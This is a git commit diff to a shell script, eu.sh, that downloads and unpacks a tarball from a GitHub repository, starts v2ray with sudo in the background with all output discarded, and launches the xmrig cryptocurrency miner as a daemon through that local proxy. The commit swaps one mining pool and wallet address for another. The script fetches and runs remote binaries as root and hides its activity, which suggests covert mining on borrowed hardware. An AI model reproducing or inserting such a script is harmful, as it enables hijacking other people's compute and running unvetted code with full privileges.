bc15410ab5c0e6185310c7924743d4895d4e1a48
prendibs <94189491+prendibs@users.noreply.github.com>
2025-08-12 12:30:16 +0700

    Update eu.sh

--- eu.sh
+++ eu.sh
@@ -4,5 +4,4 @@
 wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
 nohup sudo ./v2ray run --config=eu.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
-sudo ./xmrig -B -x 127.0.0.1:443 -o eu.0xpool.io:3333 -u 0x5e07fa9eb92d6e16894641c714e1412b64e1c007 -p eu -a rx/0 -k --randomx-1gb-pages
-
+sudo ./xmrig -B -x 127.0.0.1:443 -o xtm-rx-eu.kryptex.network:7038 -u 12DS2mgfbHQGSvrf1CxsKbYG8umBTCcsz9LoVAaSyM3qyYWVqaNqkCBZb3TdaTYPZGqRKHmxi4Ur1wMJzHZbraexTw9 -p eu -a rx/0 -k
